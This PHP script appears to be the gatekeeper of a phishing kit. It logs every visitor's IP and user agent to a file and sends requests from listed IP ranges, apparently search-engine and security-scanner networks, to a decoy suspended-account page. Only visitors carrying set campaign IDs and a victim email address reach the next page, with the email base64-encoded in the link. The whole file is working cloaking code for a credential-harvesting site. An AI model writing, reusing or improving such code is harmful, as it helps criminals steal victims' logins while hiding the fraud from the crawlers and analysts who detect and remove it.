<?php
error_reporting(0);
//$ips = $_SERVER['REMOTE_ADDR'];
function ClientIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$ips = ClientIpAddr();
date_default_timezone_set('America/Chicago');
$date = @date("l d F H:i:s" , time());
$url = $_SERVER['REQUEST_URI'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$errorP = 'https://www.businessesforsale.co.nz/cgi-sys/suspendedpage.cgi';

$fp = fopen("lci.txt", "a");
fputs($fp, "IP: $ips - DATE: $date - [URL: $url] | [Agent: $agent] \n");
fclose($fp);

$bannedIP = array("^66.102.*.*", "^216.163.*.*","^79.180.*.*","^66.150.*.*","^51.15.*.*","^40.78.*.*","^64.74.*.*","^217.74.*.*","^185.75.*.*","^141.228.*.*","^66.150.*.*", "^104.132.*.*","^38.100.21.*","^38.105.*.*","^213.254.241.*","^184.173.*.*","^163.172.*.*", "^212.47.*.*","^79.181.*.*","^64.233.*.*","^64.106.213.*","^64.246.163.*","^63.110.*.*","^62.149.225.*","^167.160.98.*","^64.235.153.*","^64.235.154.*","^109.67.199.*","^109.234.108.*","^54.169.*.*","^46.101.*.*","^69.63.64.*","^51.15.*.*","^91.103.66.*");

if(in_array($ips,$bannedIP)) {
     header("Location:".$errorP.""); exit;
}
else {
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$ips)){
               header("Location:".$errorP.""); exit;
          }
     }
}


$query_str = $_SERVER['QUERY_STRING'];
$change_4rm = array("&amp;", "%40", "\u0026");
$change_to = array("&", "@", "&");
$query_str = str_replace($change_4rm, $change_to, $query_str);

$coming = urldecode($query_str);
parse_str($coming, $get_array);

$ecf = $get_array['ecf'];

$array = file('bad.st',FILE_IGNORE_NEW_LINES);
if(in_array($ecf,$array)){
   header("Location:".$errorP.""); exit;
}

$email = base64_encode($ecf);

if($get_array['cordid'] != '6' || $get_array['fm_id'] != '71' || !preg_match("/^.+@.+\..+$/i" , $ecf) || strlen($ecf) < 9)
{
    header("Location:".$errorP.""); exit;
}
else {
    header("Location:index.php?mdcf=".$email."");
    exit;
}
